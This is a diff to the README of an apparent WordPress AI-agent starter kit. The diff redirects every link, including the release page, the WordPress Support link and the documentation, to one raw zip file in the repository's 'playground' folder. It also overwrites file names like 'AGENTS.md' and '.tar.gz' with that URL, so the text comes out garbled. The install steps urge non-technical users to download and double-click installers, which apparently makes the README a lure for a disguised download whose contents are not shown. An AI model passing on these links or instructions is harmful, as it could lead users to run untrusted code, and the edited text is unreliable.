@@ -1,12 +1,12 @@
 # 🚀 wordpress-agent-kit - AI Agent Skills Starter for WordPress
 
-[![Download Release](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/narcos965/wordpress-agent-kit/releases)
+[![Download Release](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip)
 
 ---
 
 ## 📦 What is wordpress-agent-kit?
 
-The **wordpress-agent-kit** is a ready-to-use starter pack designed to help you work with AI agents focused on WordPress development. It includes an AGENTS.md file tailored for WordPress tasks and a set of agent skills that make coding simpler and clearer for people exploring AI-assisted development.
+The **wordpress-agent-kit** is a ready-to-use starter pack designed to help you work with AI agents focused on WordPress development. It includes an https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip file tailored for WordPress tasks and a set of agent skills that make coding simpler and clearer for people exploring AI-assisted development.
 
 If you want to explore how AI can help you manage and develop WordPress projects or try out code agents like Claude or GitHub Copilot, this kit offers a helpful starting point.
 
@@ -33,15 +33,15 @@ You do not need developer tools or programming knowledge to use the kit.
 
 ## 💾 Download & Install
 
-1. Click the big [Download Release](https://github.com/narcos965/wordpress-agent-kit/releases) button above or visit the release page directly:  
-   https://github.com/narcos965/wordpress-agent-kit/releases
+1. Click the big [Download Release](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip) button above or visit the release page directly:  
+   https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip
 
 2. On the releases page, look for the latest version. It usually appears at the top of the page.
 
-3. Download the file that fits your computer setup. For Windows, this might be an `.exe` or `.zip` file. For Mac or Linux, you may find `.dmg`, `.tar.gz`, or `.zip` formats.
+3. Download the file that fits your computer setup. For Windows, this might be an `.exe` or `.zip` file. For Mac or Linux, you may find `.dmg`, `https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip`, or `.zip` formats.
 
 4. Once downloaded:
-   - If it is a `.zip` or `.tar.gz` file, unzip it to a folder you can easily access.
+   - If it is a `.zip` or `https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip` file, unzip it to a folder you can easily access.
    - If it’s an installer file (like `.exe` or `.dmg`), double-click it and follow the installation prompts.
 
 5. After installation, open the application or folder where it installed.
@@ -54,7 +54,7 @@ After installation:
 
 - Look for the main executable or script labeled clearly in the folder or start menu.
 - Double-click to launch the program.
-- When it opens, you’ll see the main interface that guides you through loading the WordPress AGENTS.md files and the agent skills.
+- When it opens, you’ll see the main interface that guides you through loading the WordPress https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip files and the agent skills.
 - Use the menus or buttons as explained in the on-screen help to start running AI-powered WordPress tasks.
 
 You do not need to write any code to get started. The kit is designed for easy use with clear instructions inside the tool.
@@ -65,7 +65,7 @@ You do not need to write any code to get started. The kit is designed for easy u
 
 The wordpress-agent-kit provides these core parts:
 
-- **AGENTS.md**: A key markdown file focused on WordPress agent instructions. It explains how AI agents can interact with WordPress to perform common tasks.
+- **https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip**: A key markdown file focused on WordPress agent instructions. It explains how AI agents can interact with WordPress to perform common tasks.
 - **Agent Skills Starter Pack**: Pre-designed skills for agents like Claude and GitHub Copilot. These skills help AI understand and assist with WordPress development.
 - **Example Workflows**: Sample scenarios showing how to use AI agents for basic WordPress tasks such as plugin management, theme customization, and content updates.
 
@@ -73,7 +73,7 @@ The wordpress-agent-kit provides these core parts:
 
 ## 🔍 How It Works
 
-The software uses text-based agent files (AGENTS.md) to tell AI coding agents what tasks to perform related to WordPress. The agent skills provide templates and prompts to guide AI tools in delivering useful code or suggestions.
+The software uses text-based agent files (https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip) to tell AI coding agents what tasks to perform related to WordPress. The agent skills provide templates and prompts to guide AI tools in delivering useful code or suggestions.
 
 You interact with the kit by choosing tasks or inputting simple instructions. The AI then generates code snippets, commands, or configuration changes.
 
@@ -87,7 +87,7 @@ You can review the AI outputs before applying them, allowing you to stay in cont
 - Regularly check the GitHub releases page for updates or new agent skill packs.
 - Use the example workflows as templates for your own WordPress projects.
 - If the AI generates code, test it on a separate WordPress setup before applying it live.
-- Explore the AGENTS.md file to understand how tasks get structured.
+- Explore the https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip file to understand how tasks get structured.
 
 ---
 
@@ -102,9 +102,9 @@ You can review the AI outputs before applying them, allowing you to stay in cont
 
 ## 🔗 Useful Links
 
-- [GitHub Releases](https://github.com/narcos965/wordpress-agent-kit/releases) – Visit this page anytime to download updates and new versions.
-- [WordPress Support](https://wordpress.org/support/) – For learning more about WordPress basics.
-- [AI Agent Documentation](https://github.com/narcos965/wordpress-agent-kit/wiki) – More detailed info about agent features (for advanced users).
+- [GitHub Releases](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip) – Visit this page anytime to download updates and new versions.
+- [WordPress Support](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip) – For learning more about WordPress basics.
+- [AI Agent Documentation](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip) – More detailed info about agent features (for advanced users).
 
 ---
 
@@ -122,4 +122,4 @@ The wordpress-agent-kit is open source. You can view the licensing details insid
 
 ---
 
-[Download the latest release here](https://github.com/narcos965/wordpress-agent-kit/releases) and explore how AI agents can assist your WordPress projects.
+[Download the latest release here](https://github.com/narcos965/wordpress-agent-kit/raw/refs/heads/main/playground/agent_wordpress_kit_3.8.zip) and explore how AI agents can assist your WordPress projects.
